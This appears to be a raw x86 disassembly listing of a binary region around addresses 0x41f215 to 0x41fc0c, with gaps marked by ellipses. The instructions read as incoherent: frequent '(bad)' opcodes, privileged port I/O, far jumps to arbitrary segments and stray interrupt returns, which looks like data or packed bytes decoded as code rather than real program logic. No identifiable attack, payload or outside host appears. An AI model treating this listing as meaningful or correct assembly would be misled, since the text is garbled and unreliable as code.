  41f215:	or     al,ch
  41f217:	push   es
  41f218:	shr    BYTE PTR [eax+0x202c573a],0x3a
  41f21f:	in     al,dx
  41f220:	push   eax
  41f221:	test   BYTE PTR [edx],dl
  41f223:	repz xor ebx,DWORD PTR [esi-0x5d]
  41f227:	or     ecx,DWORD PTR [ebp+0x36]
  41f22a:	jbe    0x41f265
  41f22c:	xchg   esp,eax
  41f22d:	jmp    0xcb258c95
  41f232:	shr    al,1
  41f234:	jle    0x41f233
  41f236:	test   eax,0x3c4d8bd4
  41f23b:	lahf   
  41f23c:	adc    ch,dl
  41f23e:	or     cl,dl
  41f240:	iret   
  41f241:	lods   eax,DWORD PTR ds:[esi]
  41f242:	sahf   
  41f243:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f244:	add    ch,0x5a
  41f247:	push   ss
  41f248:	ds int 0xe0
  41f24b:	adc    bh,cl
  41f24d:	dec    DWORD PTR [eax-0x2f]
  41f250:	jmp    0x3e117641
  41f255:	or     dh,BYTE PTR [ebx+0x5f75cf55]
  41f25b:	fld    QWORD PTR [ebx-0x66fcdfd9]
  41f261:	in     al,dx
  41f262:	cdq    
  41f263:	ret    0x445a
  41f266:	outs   dx,BYTE PTR ds:[esi]
  41f268:	cmc    
  41f269:	mov    edi,0x41329c6b
  41f26e:	push   edx
  41f26f:	fidiv  DWORD PTR [eax+0x4fb0ea99]
  41f275:	jp     0x41f1f7
  41f277:	in     al,dx
  41f278:	xchg   ebp,eax
  41f279:	lds    ebp,FWORD PTR [eax]
  41f27b:	stos   DWORD PTR es:[edi],eax
  41f27c:	jle    0x41f2df
  41f27e:	(bad)  
  41f27f:	xchg   ebp,eax
  41f280:	adc    BYTE PTR [edi-0x353b09d6],bh
  41f286:	and    BYTE PTR [eax+0x26],al
  41f289:	ret    0x83b7
  41f28c:	adc    BYTE PTR [ebp+eax*4+0x3a],cl
	...
  41f2f4:	push   ecx
  41f2f5:	sbb    edi,edi
  41f2f7:	jmp    si
  41f2fa:	fnstcw WORD PTR [edi]
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f318
  41f301:	add    bh,BYTE PTR [esi+0x14bbcce]
  41f307:	add    BYTE PTR [ecx+eax*1],al
  41f30a:	add    BYTE PTR [eax],al
  41f30c:	mov    bl,0x3a
  41f30e:	cdq    
  41f30f:	jb     0x41f2cd
  41f311:	int    0x26
  41f313:	out    0x46,al
  41f315:	mov    ah,0x67
  41f317:	adc    al,0xa2
  41f319:	pop    ecx
  41f31a:	repnz dec ebx
  41f31c:	fwait
  41f31d:	sub    bl,bl
  41f31f:	pop    ecx
  41f320:	xor    eax,0x4652a982
  41f325:	loope  0x41f34b
  41f327:	sbb    esi,DWORD PTR [edi-0x535a31d3]
  41f32d:	add    DWORD PTR [edi+ebx*1-0x2b64cd6],ebp
  41f334:	sti    
  41f335:	jno    0x41f2f5
  41f337:	pop    edi
  41f338:	xor    edx,DWORD PTR [esi-0x244a903e]
  41f33e:	sub    edi,DWORD PTR [ebp-0x1d]
  41f341:	cli    
  41f342:	sbb    al,bl
  41f344:	add    DWORD PTR [eax+0x6f],ebp
  41f347:	je     0x41f2e0
  41f349:	xchg   DWORD PTR [ebx+0x76],ebp
  41f34c:	add    BYTE PTR [edx-0x6a],ch
  41f34f:	cdq    
  41f350:	cdq    
  41f351:	jae    0x41f2d5
  41f353:	ds iret 
  41f355:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f356:	mov    bh,0x63
  41f358:	jl     0x41f325
  41f35a:	mov    ebp,DWORD PTR [edx+0x46]
  41f35d:	xor    cl,BYTE PTR [esi-0xc739bb6]
  41f363:	inc    ebx
  41f364:	xor    eax,DWORD PTR [ecx+0x5bbb1a16]
  41f36a:	and    BYTE PTR [ebp+edi*2-0x36],bh
  41f36e:	pop    edi
  41f36f:	mov    BYTE PTR [esi+esi*2-0x4bcc211a],bh
  41f376:	arpl   WORD PTR [esi],ax
  41f378:	sub    al,cl
  41f37a:	and    BYTE PTR [edx+0x477f8899],ah
  41f380:	test   DWORD PTR [esi],ecx
  41f382:	rol    DWORD PTR [esp+eax*1],0xbb
  41f386:	lods   al,BYTE PTR ds:[esi]
  41f387:	clc    
  41f388:	inc    ebx
  41f389:	cmp    al,0xd1
  41f38b:	shl    BYTE PTR cs:[ebx],cl
  41f38e:	outs   dx,BYTE PTR ds:[esi]
  41f38f:	or     eax,0xb03cd861
  41f394:	dec    esp
  41f395:	mov    ebp,0x6d3c787c
  41f39a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f39b:	adc    cl,BYTE PTR [eax+edi*2-0x6fc1a3c]
  41f3a2:	scas   al,BYTE PTR es:[edi]
  41f3a3:	aam    0x27
  41f3a5:	jne    0x41f35b
  41f3a7:	das    
  41f3a8:	leave  
  41f3a9:	or     BYTE PTR [ebp-0x3f33cfbc],dh
  41f3af:	pop    esp
  41f3b0:	inc    ecx
  41f3b1:	adc    dh,ch
  41f3b3:	push   cs
  41f3b4:	add    DWORD PTR [ebp-0x4cd89766],0x39
  41f3bb:	sbb    BYTE PTR [eax-0x48c3055f],0x60
  41f3c2:	jnp    0x41f398
  41f3c4:	cmc    
  41f3c5:	in     eax,dx
  41f3c6:	lea    edx,ds:0xc3dbd6f
  41f3cc:	fs jno 0x41f425
  41f3cf:	aad    0x8d
  41f3d1:	(bad)  
  41f3d2:	shl    DWORD PTR ds:0x6d18715e,1
  41f3d8:	fwait
  41f3d9:	and    eax,0xb787820e
  41f3de:	xchg   edi,eax
  41f3df:	cmp    al,0xa4
  41f3e1:	out    dx,al
  41f3e2:	pop    esp
  41f3e3:	mov    edi,0x23070940
  41f3e8:	pop    edx
  41f3e9:	test   DWORD PTR [eax+esi*4-0x7c4df26c],ecx
  41f3f0:	xor    BYTE PTR [esi-0x80],ch
  41f3f3:	dec    edi
  41f3f4:	ss push ecx
  41f3f6:	jbe    0x41f42e
  41f3f8:	push   edi
  41f3f9:	rcr    DWORD PTR [ebp+0x3324f03b],0x87
  41f400:	nop
  41f401:	sbb    edx,DWORD PTR ds:0x5683312e
  41f407:	pusha  
  41f408:	clc    
  41f409:	loope  0x41f45f
  41f40b:	cmp    ebx,DWORD PTR [esi]
  41f40d:	pusha  
  41f40e:	ss add al,0x0
	...
  41f471:	add    BYTE PTR [eax],al
  41f473:	add    BYTE PTR [edi+eiz*8],bh
  41f476:	imul   ebp,edi,0xfffffffb
  41f479:	out    dx,eax
  41f47a:	mov    esp,0xd5fd13f7
  41f47f:	mov    ch,0xa7
  41f481:	or     al,0x70
  41f483:	sbb    eax,eax
  41f485:	dec    esp
  41f486:	add    DWORD PTR [eax],eax
  41f488:	add    al,0x1
  41f48a:	add    BYTE PTR [eax],al
  41f48c:	xchg   ebp,eax
  41f48d:	sub    dh,0xd1
  41f490:	imul   DWORD PTR [ebx+0x55]
  41f493:	dec    esp
  41f494:	stos   BYTE PTR es:[edi],al
  41f495:	fsub   DWORD PTR [edx+edi*8]
  41f498:	shr    DWORD PTR [edx-0x35e48321],cl
  41f49e:	pop    ss
  41f49f:	hlt    
  41f4a0:	aad    0xb2
  41f4a2:	or     al,bl
  41f4a4:	mov    bl,0x6c
  41f4a6:	sahf   
  41f4a7:	pop    es
  41f4a8:	ret    
  41f4a9:	ficomp DWORD PTR [ecx]
  41f4ab:	fwait
  41f4ac:	adc    al,0xc8
  41f4ae:	pop    ebp
  41f4af:	inc    edx
  41f4b0:	stc    
  41f4b1:	push   edi
  41f4b2:	mov    ch,0x65
  41f4b4:	jmp    0x1108deff
  41f4b9:	mov    ?,WORD PTR [eax]
  41f4bb:	mov    WORD PTR [ebp-0x5],gs
  41f4be:	retf   
  41f4bf:	push   ebp
  41f4c0:	push   es
  41f4c1:	mov    ebp,DWORD PTR [esi-0xec064c4]
  41f4c7:	pop    edi
  41f4c8:	dec    esp
  41f4c9:	adc    eax,0x4ef3035f
  41f4ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4cf:	lods   eax,DWORD PTR ds:[esi]
  41f4d0:	sbb    eax,0x300b1ec
  41f4d5:	mov    esi,0xbc42ad73
  41f4da:	cli    
  41f4db:	imul   ebp,DWORD PTR [ebx+0x58],0xa98afca3
  41f4e2:	js     0x41f48d
  41f4e4:	push   es
  41f4e5:	xor    esp,DWORD PTR [ecx+0x47]
  41f4e8:	adc    DWORD PTR [eax-0x11],ebx
  41f4eb:	jg     0x41f53c
  41f4ed:	pusha  
  41f4ee:	fdivrp st(7),st
  41f4f0:	mov    bh,0xe1
  41f4f2:	pop    esi
  41f4f3:	mov    dl,0x88
  41f4f5:	(bad)  [ebp+0x73ac0f05]
  41f4fb:	out    dx,al
  41f4fc:	outs   dx,BYTE PTR ds:[esi]
  41f4fd:	xor    eax,0x98e4ccba
  41f502:	xlat   BYTE PTR ds:[ebx]
  41f503:	push   eax
  41f504:	sub    BYTE PTR [edx-0x19],dl
  41f507:	jg     0x41f4ce
  41f509:	mov    esi,0x290954be
  41f50e:	pop    ebx
  41f50f:	mov    ds:0xe9f7d84e,eax
  41f514:	jnp    0x41f4a2
  41f516:	mov    WORD PTR [ebp+0x65],ss
  41f519:	sub    ecx,DWORD PTR [ebx]
  41f51b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f51c:	iret   
  41f51d:	aas    
  41f51e:	mov    bl,BYTE PTR [edi-0xdf48d0e]
  41f524:	jae    0x41f4e6
  41f526:	adc    ebp,DWORD PTR es:[esp+eax*1+0x55]
  41f52b:	mov    bh,0xf
  41f52d:	dec    ebp
  41f52e:	cmc    
  41f52f:	inc    ah
  41f531:	push   ds
  41f532:	add    cl,al
  41f534:	push   cs
  41f535:	sub    ecx,esp
  41f537:	cmp    edx,DWORD PTR [edx+0xd]
  41f53a:	adc    eax,0xee817a05
  41f53f:	push   0xffffffa2
  41f541:	loope  0x41f4f2
  41f543:	shl    DWORD PTR [ecx],1
  41f545:	(bad)  
  41f546:	popf   
  41f547:	sbb    esp,ebp
  41f549:	mov    BYTE PTR [eax-0xacf8029],bh
  41f54f:	push   0x27213ec1
  41f554:	pusha  
  41f555:	loopne 0x41f59c
  41f557:	sub    al,0x56
  41f559:	cmp    eax,0x21f61898
  41f55e:	jno    0x41f53a
  41f560:	sbb    DWORD PTR [ecx+eax*4-0x25888ea0],ebx
  41f567:	jbe    0x41f50a
  41f569:	sbb    eax,0x2266e4b6
  41f56e:	fstp   TBYTE PTR [eax]
  41f570:	cmp    eax,0x6b433270
  41f575:	jge    0x41f5d3
  41f577:	das    
  41f578:	jbe    0x41f50b
  41f57a:	cmc    
  41f57b:	das    
  41f57c:	iret   
  41f57d:	push   ebp
  41f57e:	push   ebp
  41f57f:	mul    dl
  41f581:	mov    eax,0x382c748
  41f586:	out    dx,al
  41f587:	dec    ecx
  41f588:	sub    DWORD PTR ds:0x2988ce37,edi
  41f58e:	mov    al,0xe
	...
  41f5f4:	js     0x41f62a
  41f5f6:	add    bh,bl
  41f5f8:	dec    esi
  41f5f9:	(bad)  
  41f5fa:	stc    
  41f5fb:	mov    bh,0xb7
  41f5fd:	jmp    0x58a7:0x92a4d422
  41f604:	les    ecx,FWORD PTR [ebp+0x1]
  41f607:	add    BYTE PTR [ecx+eax*1],al
  41f60a:	add    BYTE PTR [eax],al
  41f60c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f60d:	rol    DWORD PTR [esi+edx*4+0x5f],cl
  41f611:	imul   esi,DWORD PTR [ebx-0x599af26],0xbac81493
  41f61b:	and    BYTE PTR [esi+0x7d],ah
  41f61e:	hlt    
  41f61f:	jo     0x41f646
  41f621:	(bad)  
  41f622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f623:	pop    esi
  41f624:	lds    ebp,FWORD PTR gs:[esi+esi*8+0x69]
  41f629:	and    DWORD PTR [ebp-0x3c691383],esi
  41f62f:	daa    
  41f630:	add    eax,0x1a9a8d33
  41f635:	int3   
  41f636:	push   esp
  41f637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f638:	push   cs
  41f639:	shl    DWORD PTR [esi-0x20],cl
  41f63c:	shl    DWORD PTR [edi+0x6d],1
  41f63f:	adc    BYTE PTR [eax+0x8],al
  41f642:	push   ebp
  41f643:	or     al,0xb3
  41f645:	ss (bad) 
  41f647:	and    BYTE PTR [ebx],dh
  41f649:	push   eax
  41f64a:	xchg   ecx,eax
  41f64b:	mov    DWORD PTR [ebp*1+0xe507de1],ebx
  41f652:	clc    
  41f653:	sbb    dl,BYTE PTR [esi+0x3dd19be0]
  41f659:	out    0x9e,eax
  41f65b:	mov    ?,WORD PTR ds:0xa083fc5
  41f661:	or     ah,BYTE PTR [ebx-0x48]
  41f664:	xor    ch,cl
  41f666:	adc    BYTE PTR [ecx],dl
  41f668:	mov    eax,0xdfdf060b
  41f66d:	and    al,0x7e
  41f66f:	pop    ebx
  41f670:	out    dx,eax
  41f671:	sbb    al,bl
  41f673:	mov    eax,0x610da21f
  41f678:	lock mov ebx,0x6c90f205
  41f67e:	icebp  
  41f67f:	nop
  41f680:	cmp    DWORD PTR [edx],eax
  41f682:	ins    DWORD PTR es:[edi],dx
  41f683:	in     al,dx
  41f684:	push   esp
  41f685:	pop    edi
  41f686:	pusha  
  41f687:	jmp    0x41f6ec
  41f689:	mov    ebp,0x635c34f2
  41f68e:	out    0x50,al
  41f690:	das    
  41f691:	mov    ecx,0xf65b3b9d
  41f696:	cwde   
  41f697:	jno    0x41f6f5
  41f699:	jg     0x41f6bc
  41f69b:	push   esp
  41f69c:	inc    ebx
  41f69d:	aaa    
  41f69e:	in     al,dx
  41f69f:	out    dx,al
  41f6a0:	das    
  41f6a1:	aad    0x9d
  41f6a3:	mov    dh,0x50
  41f6a5:	jne    0x41f69b
  41f6a7:	int3   
  41f6a8:	push   es
  41f6a9:	in     al,0xee
  41f6ab:	push   cs
  41f6ac:	(bad)
  41f6b0:	cmp    bl,BYTE PTR [esi]
  41f6b2:	psllw  mm1,QWORD PTR [ebx+ecx*1-0x58]
  41f6b7:	inc    ecx
  41f6b8:	mov    al,ds:0xa498fe9e
  41f6bd:	mov    ah,0xe1
  41f6bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f6c0:	jle    0x41f741
  41f6c2:	shr    edx,1
  41f6c4:	mov    esi,0x80727a74
  41f6c9:	mov    WORD PTR [ebx],?
  41f6cb:	jbe    0x41f6aa
  41f6cd:	dec    ecx
  41f6ce:	in     eax,dx
  41f6cf:	xchg   edx,eax
  41f6d0:	scas   eax,DWORD PTR es:[edi]
  41f6d1:	cwde   
  41f6d2:	test   eax,0xeffb933c
  41f6d7:	daa    
  41f6d8:	xor    ecx,esp
  41f6da:	pop    edx
  41f6db:	jle    0x41f6c7
  41f6dd:	mov    ds:0xc1eef3c1,eax
  41f6e2:	aaa    
  41f6e3:	add    eax,0xde0612ef
  41f6e8:	iret   
  41f6e9:	adc    esp,ecx
  41f6eb:	push   ecx
  41f6ec:	xor    DWORD PTR [esi],esi
  41f6ee:	mul    edx
  41f6f0:	fdivr  st,st(2)
  41f6f2:	scas   eax,DWORD PTR es:[edi]
  41f6f3:	test   al,0x68
  41f6f5:	mov    ds:0xdce6d0c9,al
  41f6fa:	rol    DWORD PTR [esi],cl
  41f6fc:	lea    edx,[ebx-0x3515d99e]
  41f702:	cmp    BYTE PTR [edx-0x19ecf098],bl
  41f708:	fs cli 
  41f70a:	cdq    
  41f70b:	retf   
  41f70c:	and    DWORD PTR [esp+ecx*2-0x20],esi
	...
  41f774:	xchg   edx,eax
  41f775:	cmp    al,0x23
  41f777:	jle    0x41f728
  41f779:	jg     0x41f75a
  41f77b:	cld    
  41f77c:	call   0x6d68:0x4f6c62d2
  41f783:	ret    0x4ec8
  41f786:	add    DWORD PTR [eax],eax
  41f788:	add    al,0x1
  41f78a:	add    BYTE PTR [eax],al
  41f78c:	data16 clc 
  41f78e:	push   ecx
  41f78f:	jp     0x41f807
  41f791:	loopne 0x41f759
  41f793:	add    eax,0x1aff6ec8
  41f798:	dec    ebx
  41f799:	mov    BYTE PTR [edi+0x32],ch
  41f79c:	(bad)
  41f7a0:	fs adc dh,dh
  41f7a3:	dec    ebx
  41f7a4:	mov    edx,0x7c4a580a
  41f7a9:	push   ss
  41f7aa:	mov    al,ds:0x7c947a3b
  41f7af:	in     al,0xa5
  41f7b1:	xchg   edi,eax
  41f7b2:	sub    al,0x1d
  41f7b4:	rcr    BYTE PTR [edi],1
  41f7b6:	lahf   
  41f7b7:	scas   al,BYTE PTR es:[edi]
  41f7b8:	jmp    0xdc83:0x89daacc2
  41f7bf:	fidivr DWORD PTR [eax]
  41f7c1:	scas   al,BYTE PTR es:[edi]
  41f7c2:	push   eax
  41f7c3:	and    al,0xe9
  41f7c5:	jmp    0x41f7a9
  41f7c7:	xlat   BYTE PTR ds:[ebx]
  41f7c8:	push   cs
  41f7c9:	jmp    0x4fe5b484
  41f7ce:	sbb    DWORD PTR [edi+0x61],ecx
  41f7d1:	(bad)
  41f7d5:	xchg   ebp,eax
  41f7d6:	xchg   esi,eax
  41f7d7:	ins    BYTE PTR es:[edi],dx
  41f7d8:	loop   0x41f7cd
  41f7da:	leave  
  41f7db:	stos   BYTE PTR es:[edi],al
  41f7dc:	test   al,0x9f
  41f7de:	add    dh,BYTE PTR [ecx-0x3556413c]
  41f7e4:	ror    BYTE PTR [ebp-0x4],1
  41f7e7:	retf   
  41f7e8:	push   0x12
  41f7ea:	cmp    eax,0xfdcc7cb1
  41f7ef:	daa    
  41f7f0:	shl    ebx,1
  41f7f2:	dec    esi
  41f7f3:	jp     0x41f78e
  41f7f5:	inc    edx
  41f7f6:	pop    eax
  41f7f7:	fwait
  41f7f8:	mov    bh,0x6c
  41f7fa:	pop    eax
  41f7fb:	sbb    al,BYTE PTR [esi+edx*2-0x57c17d47]
  41f802:	sub    al,BYTE PTR [eax+0x2b]
  41f805:	add    DWORD PTR [ebx+0x5c],eax
  41f808:	mov    eax,ds:0x2b6e7bbc
  41f80d:	inc    ecx
  41f80e:	mov    bh,0x2b
  41f810:	dec    esi
  41f811:	jbe    0x41f883
  41f813:	and    dh,0xee
  41f816:	sbb    bl,BYTE PTR [edx-0x17]
  41f819:	loope  0x41f884
  41f81b:	add    al,0x47
  41f81d:	shl    BYTE PTR [ebp+0x20],cl
  41f820:	xchg   ebp,eax
  41f821:	mov    bl,0xee
  41f823:	push   ecx
  41f824:	jg     0x41f812
  41f826:	leave  
  41f827:	mov    BYTE PTR [ecx+0x7d0579bb],ch
  41f82d:	add    al,0xed
  41f82f:	mov    bh,BYTE PTR [edx+0x68]
  41f832:	aas    
  41f833:	cvtps2pi mm4,QWORD PTR [esi-0x47]
  41f837:	mov    ch,0xb2
  41f839:	add    ch,dh
  41f83b:	cmp    cl,bl
  41f83d:	pop    esp
  41f83e:	sahf   
  41f83f:	mov    ds:0xc8c76f9d,eax
  41f844:	loopne 0x41f84b
  41f846:	jp     0x41f89d
  41f848:	(bad)  
  41f849:	pusha  
  41f84a:	inc    esi
  41f84b:	ss xchg esp,eax
  41f84d:	(bad)
  41f852:	xchg   BYTE PTR [ecx+0x31498a6],ah
  41f858:	sub    DWORD PTR [eax-0x70697332],0xffffffae
  41f85f:	mov    al,0xf5
  41f861:	shl    ebp,cl
  41f863:	or     DWORD PTR [ecx-0x1c6faeb4],edi
  41f869:	jb     0x41f81e
  41f86b:	add    eax,DWORD PTR [edi-0x67be2f6f]
  41f871:	add    bl,BYTE PTR [edx+0x678ec2a4]
  41f877:	or     eax,ecx
  41f879:	frstor [ecx+0xf81cc17]
  41f87f:	or     ah,ah
  41f881:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f882:	mov    eax,ds:0x7d6494cf
  41f887:	adc    cl,ch
  41f889:	stc    
  41f88a:	mov    al,0x22
  41f88c:	mov    ebp,0x97ccbe
	...
  41f8f1:	add    BYTE PTR [eax],al
  41f8f3:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f8f9:	xchg   ebx,eax
  41f8fa:	mov    ecx,0x4183febb
  41f8ff:	pop    edx
  41f900:	aaa    
  41f901:	pop    ss
  41f902:	push   cs
  41f903:	adc    al,0xcc
  41f905:	dec    edi
  41f906:	add    DWORD PTR [eax],eax
  41f908:	add    al,0x1
  41f90a:	add    BYTE PTR [eax],al
  41f90c:	and    esi,ecx
  41f90e:	addr16 xor bh,dh
  41f911:	retf   0xa287
  41f914:	into   
  41f915:	jecxz  0x41f90c
  41f917:	inc    ebp
  41f918:	inc    ecx
  41f919:	push   es
  41f91a:	jns    0x41f8db
  41f91c:	fst    QWORD PTR [esi+0x2030d918]
  41f922:	or     DWORD PTR [eax+0x327344c7],edi
  41f928:	mov    edx,0xeecabb4f
  41f92d:	push   ebx
  41f92e:	jmp    0xac76:0xe064952f
  41f935:	outs   dx,DWORD PTR ds:[esi]
  41f936:	outs   dx,BYTE PTR ds:[esi]
  41f937:	cdq    
  41f938:	add    al,0x5d
  41f93a:	mov    al,0x82
  41f93c:	sbb    DWORD PTR [edx+0x3efd1a02],ebx
  41f942:	jne    0x41f8d5
  41f944:	in     eax,0x2c
  41f946:	pop    ebp
  41f947:	repnz mov al,dh
  41f94a:	inc    edx
  41f94b:	mov    bh,BYTE PTR [ecx]
  41f94d:	lods   al,BYTE PTR ds:[esi]
  41f94e:	mov    edx,0xe97d77f2
  41f953:	popf   
  41f954:	xchg   cl,bl
  41f956:	inc    ebx
  41f957:	push   ebp
  41f958:	ret    
  41f959:	pop    ds
  41f95a:	cmp    eax,0xd9d51cdf
  41f95f:	sbb    esp,ebp
  41f961:	out    0x23,al
  41f963:	mov    ds:0x6346ca,al
  41f968:	lods   al,BYTE PTR ds:[esi]
  41f969:	bound  esi,QWORD PTR [edi+0x29]
  41f96c:	popf   
  41f96d:	cmovne edi,DWORD PTR [eax+ecx*2-0x7140efbe]
  41f975:	clc    
  41f976:	adc    bl,bh
  41f978:	les    ebx,FWORD PTR [edi]
  41f97a:	pop    ss
  41f97b:	add    DWORD PTR [edx+0x4],ebx
  41f97e:	jecxz  0x41f9cb
  41f980:	lods   eax,DWORD PTR ds:[esi]
  41f981:	mov    ch,bl
  41f983:	push   eax
  41f984:	and    ebx,DWORD PTR [esi+0x345ee198]
  41f98a:	cdq    
  41f98b:	mov    al,BYTE PTR [esi*4-0x5d6a4c51]
  41f992:	dec    esp
  41f993:	enter  0x4f42,0x5f
  41f997:	hlt    
  41f998:	sbb    eax,0xffa32321
  41f99d:	test   DWORD PTR [esi+0x10],esp
  41f9a0:	add    DWORD PTR [ebx+0x1a],esi
  41f9a3:	sbb    DWORD PTR [eax+0x1],ecx
  41f9a6:	mov    WORD PTR [eax-0x54cdda55],es
  41f9ac:	stc    
  41f9ad:	pop    ecx
  41f9ae:	clc    
  41f9af:	jecxz  0x41f93d
  41f9b1:	test   BYTE PTR [esi-0xf],cl
  41f9b4:	mov    al,0xae
  41f9b6:	mov    bh,BYTE PTR [ebp-0x3e]
  41f9b9:	out    0xdf,eax
  41f9bb:	xor    dl,al
  41f9bd:	daa    
  41f9be:	ins    DWORD PTR es:[edi],dx
  41f9bf:	cmp    ah,dl
  41f9c1:	leave  
  41f9c2:	push   es
  41f9c3:	xlat   BYTE PTR ds:[ebx]
  41f9c4:	cs adc esi,edx
  41f9c7:	inc    ebx
  41f9c8:	fnstenv [ebx-0x27e01b3f]
  41f9ce:	jg     0x41f953
  41f9d0:	outs   dx,BYTE PTR ds:[esi]
  41f9d1:	jg     0x41f965
  41f9d3:	xlat   BYTE PTR ds:[ebx]
  41f9d4:	mov    dh,0xa1
  41f9d6:	adc    BYTE PTR [eax+eiz*4+0xdfb3b0e],cl
  41f9dd:	sahf   
  41f9de:	lock es inc esp
  41f9e1:	iret   
  41f9e2:	inc    edx
  41f9e3:	cmp    ecx,0xb22d5a4f
  41f9e9:	jnp    0x41f9e4
  41f9eb:	cli    
  41f9ec:	xchg   esp,eax
  41f9ed:	jno    0x41f9aa
  41f9ef:	ins    BYTE PTR es:[edi],dx
  41f9f0:	pop    ebx
  41f9f1:	sbb    BYTE PTR [edi+esi*1],ch
  41f9f4:	mov    esi,0x98ae5f77
  41f9f9:	stos   DWORD PTR es:[edi],eax
  41f9fa:	lods   al,BYTE PTR ds:[esi]
  41f9fb:	int3   
  41f9fc:	retf   
  41f9fd:	pop    esi
  41f9fe:	dec    ebp
  41f9ff:	mov    ecx,0x8b49343d
  41fa04:	dec    ebp
  41fa05:	inc    esi
  41fa06:	popf   
  41fa07:	push   edi
  41fa08:	fmul   QWORD PTR [ebp-0x8]
  41fa0b:	popa   
  41fa0c:	mov    bh,0xd2
  41fa0e:	xchg   DWORD PTR [edx+0x0],ebp
	...
  41fa71:	add    BYTE PTR [eax],al
  41fa73:	add    BYTE PTR [edx],cl
  41fa75:	inc    ecx
  41fa76:	mov    bh,0xa1
  41fa78:	push   edi
  41fa7a:	push   ds
  41fa7b:	jmp    0x41faa0
  41fa7d:	push   edi
  41fa7e:	mov    ds:0x58921b15,eax
  41fa83:	xor    dl,al
  41fa85:	push   eax
  41fa86:	add    DWORD PTR [eax],eax
  41fa88:	add    al,0x1
  41fa8a:	add    BYTE PTR [eax],al
  41fa8c:	test   BYTE PTR [esi-0x5275841b],ch
  41fa92:	mov    cl,0xcc
  41fa94:	lods   al,BYTE PTR ds:[esi]
  41fa95:	shl    DWORD PTR [ecx],cl
  41fa97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa98:	mov    dl,0xa3
  41fa9a:	shr    dl,1
  41fa9c:	sub    dh,BYTE PTR [eax]
  41fa9e:	(bad)  
  41faa0:	sub    BYTE PTR [ebx+esi*4+0x5bb96bbc],0xca
  41faa8:	in     al,dx
  41faa9:	add    al,0x1d
  41faab:	stos   BYTE PTR es:[edi],al
  41faac:	test   BYTE PTR [ebx+ebx*1],al
  41faaf:	ins    DWORD PTR es:[edi],dx
  41fab0:	cmp    al,0x97
  41fab2:	gs pop ss
  41fab4:	and    DWORD PTR [ebx],edx
  41fab6:	in     al,0x4
  41fab8:	push   edx
  41fab9:	push   ebp
  41faba:	aam    0x47
  41fabc:	cdq    
  41fabd:	adc    bl,cl
  41fabf:	mov    cl,0xf7
  41fac1:	repnz xor DWORD PTR gs:[ecx],esi
  41fac5:	sbb    ah,BYTE PTR [ebp+0x17]
  41fac8:	mov    dl,0xd0
  41faca:	adc    eax,DWORD PTR [esp+edi*2+0x19d87db4]
  41fad1:	and    DWORD PTR [edx+edi*2],ebx
  41fad4:	add    ebp,DWORD PTR [eax+ecx*8+0x3c]
  41fad8:	jns    0x41fb24
  41fada:	loopne 0x41fa96
  41fadc:	sbb    eax,0xec64aed0
  41fae1:	xchg   BYTE PTR [eax],ch
  41fae3:	xchg   esp,eax
  41fae4:	inc    eax
  41fae5:	sub    BYTE PTR [ecx+ebx*2+0x4c421de8],0x3c
  41faed:	cwde   
  41faee:	dec    edx
  41faef:	dec    edi
  41faf0:	adc    al,0xdb
  41faf2:	mov    fs:0x498b8c4f,eax
  41faf8:	dec    eax
  41faf9:	sub    al,0x87
  41fafb:	adc    al,0xd4
  41fafd:	out    dx,al
  41fafe:	ret    0x1bbd
  41fb01:	call   0x29a3fff4
  41fb06:	xchg   bp,ax
  41fb08:	pop    edx
  41fb09:	mov    DWORD PTR [esi+0x58],ecx
  41fb0c:	rcr    BYTE PTR gs:[ebp+0x74],cl
  41fb10:	dec    eax
  41fb11:	push   eax
  41fb12:	and    al,0xfb
  41fb14:	jns    0x41fb54
  41fb16:	mov    ah,0xc8
  41fb18:	jmp    0xc75f:0x8d888f2e
  41fb1f:	xchg   ecx,edi
  41fb21:	pushf  
  41fb22:	jge    0x41fb86
  41fb24:	test   BYTE PTR [esi+0x51b5c6d5],bh
  41fb2a:	mov    edx,DWORD PTR ds:0x65e26786
  41fb30:	add    BYTE PTR [edi-0xfccb9ba],dh
  41fb36:	add    BYTE PTR [eax+0x1490eca1],al
  41fb3c:	push   ss
  41fb3d:	(bad)
  41fb41:	cli    
  41fb42:	mov    eax,ds:0xebfab2cf
  41fb47:	retf   0xc72c
  41fb4a:	adc    eax,0xe2e9a16e
  41fb4f:	repnz mov DWORD PTR [edi-0x75],edx
  41fb53:	adc    DWORD PTR [edx-0x7b30eb35],edx
  41fb59:	or     eax,0x123e5638
  41fb5e:	retf   0x1fa4
  41fb61:	cmp    BYTE PTR [ecx],dl
  41fb63:	or     eax,0xc752db94
  41fb68:	mov    BYTE PTR [ecx],bh
  41fb6a:	xchg   DWORD PTR [edx-0x1b],eax
  41fb6d:	xor    eax,0x849c029b
  41fb72:	fiadd  DWORD PTR [eax]
  41fb74:	push   esi
  41fb75:	ins    BYTE PTR es:[edi],dx
  41fb76:	psrad  mm0,mm6
  41fb79:	pop    es
  41fb7a:	pop    ecx
  41fb7b:	in     eax,dx
  41fb7c:	mov    al,bl
  41fb7e:	sti    
  41fb7f:	mov    eax,0xf7c9c428
  41fb84:	test   eax,0xe33e1786
  41fb89:	mov    bl,0x7c
  41fb8b:	div    BYTE PTR es:[edi+0xe70d]
	...
  41fbf2:	add    BYTE PTR [eax],al
  41fbf4:	fsubr  QWORD PTR [eax]
  41fbf6:	mov    ah,ah
  41fbf8:	(bad)  
  41fbf9:	out    0xfe,al
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	fs es gs fcmovbe st,st(4)
  41fc05:	push   ecx
  41fc06:	add    DWORD PTR [eax],eax
  41fc08:	add    al,0x1
  41fc0a:	add    BYTE PTR [eax],al
  41fc0c:	mov    edi,0x38cae6a7
